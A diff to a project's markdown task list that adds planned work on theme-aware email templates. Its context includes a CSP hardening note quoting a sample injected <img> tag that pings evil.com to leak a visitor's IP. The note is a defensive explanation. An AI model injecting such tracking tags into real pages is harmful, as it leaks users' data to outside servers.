@@ -28,6 +28,15 @@ Test cases to add:
 
 **Why:** RLS policies and role-based routing are complex enough that testing against a real DB catches integration bugs that mocked tests miss. Local Supabase keeps tests fast, deterministic, and free from network flakiness — and Docker is available by default in GitHub Actions runners.
 
+### Theme-Aware Email Templates
+
+Email templates use hardcoded hex values from `src/lib/constants/colors.ts` (currently dark theme only). To match the user's theme preference, we'd need to store the preference in the database so it's available at send time. For now, emails always use the dark theme.
+
+- [ ] Add `theme` column to `profiles` table
+- [ ] Read `profile.theme` when rendering email templates
+- [ ] Add `LIGHT_THEME` constants to `src/lib/constants/colors.ts`
+- [ ] Update email templates to use theme-appropriate colors
+
 ### Host Product Images and Tighten CSP `img-src`
 
 Product images are currently arbitrary URLs provided by admins. The CSP `img-src` directive must allow `https:` (any HTTPS source) to accommodate this, which means an attacker who achieves HTML injection could load `<img src="https://evil.com/track?...">` to ping an external server and leak the visitor's IP.
